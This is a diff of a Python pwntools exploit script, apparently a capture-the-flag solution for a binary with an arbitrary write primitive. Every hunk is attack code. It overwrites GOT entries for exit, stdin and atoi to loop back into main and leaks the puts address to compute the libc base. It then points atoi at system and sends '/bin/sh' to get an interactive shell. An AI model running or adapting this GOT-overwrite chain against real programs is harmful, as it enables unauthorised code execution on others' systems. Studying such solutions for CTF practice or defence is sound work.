@@ -7,16 +7,14 @@ libc = ELF('libc.so.6')
 #raw_input("DEBUG")
 
 got_exit = 0x404038
-main_33 = 0x00000000004011ca
+main_33 = 0x4011ca
 plt_puts = 0x401030
 got_puts = 0x404018
 got_atoi = 0x404030
-__bss = 0x404080
-main = 0x00000000004011a9
-main_72 = 0x00000000004011f1
+main = 0x4011a9
 got_stdin = 0x404060
-start = 0x0000000000401080
-#e1c410
+start = 0x401080
+
 
 p.sendafter("what?\n", p32(main_33))
 p.sendafter("where?\n", str(got_exit))
@@ -39,16 +37,14 @@ p.sendlineafter("where?\n", str(got_stdin+4))
 p.sendafter("what?\n", p32(main))
 p.sendlineafter("where?\n", str(got_exit))
 
-puts = u64(p.recv(6).ljust(0x8,b'\x00'))
+puts = u64(p.recv(6)+"\x00"*2)
 log.info("Puts: "+hex(puts))
 libc_base = puts - libc.symbols['puts']
 log.info("libc_base: "+hex(libc_base))
 system = libc_base + libc.symbols['system']
 log.info("system: "+hex(system))
 stdin = libc_base + libc.symbols['_IO_2_1_stdin_']
-stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
 log.info("stdin: "+hex(stdin))
-log.info("stdout: "+hex(stdout))
 
 
 p.sendafter("what?\n", p32(main_33))
@@ -70,7 +66,7 @@ p.sendlineafter("where?\n", str(got_exit))
 p.sendafter("what?\n", p64(system)[:-4])
 p.sendlineafter("where?\n", str(got_atoi))
 
-p.sendafter("what?\n", b'\x00')
-p.sendlineafter("where?\n", b'/bin/sh\x00')
+p.sendafter("what?\n", '1')
+p.sendlineafter("where?\n", '/bin/sh\x00')
 
 p.interactive()
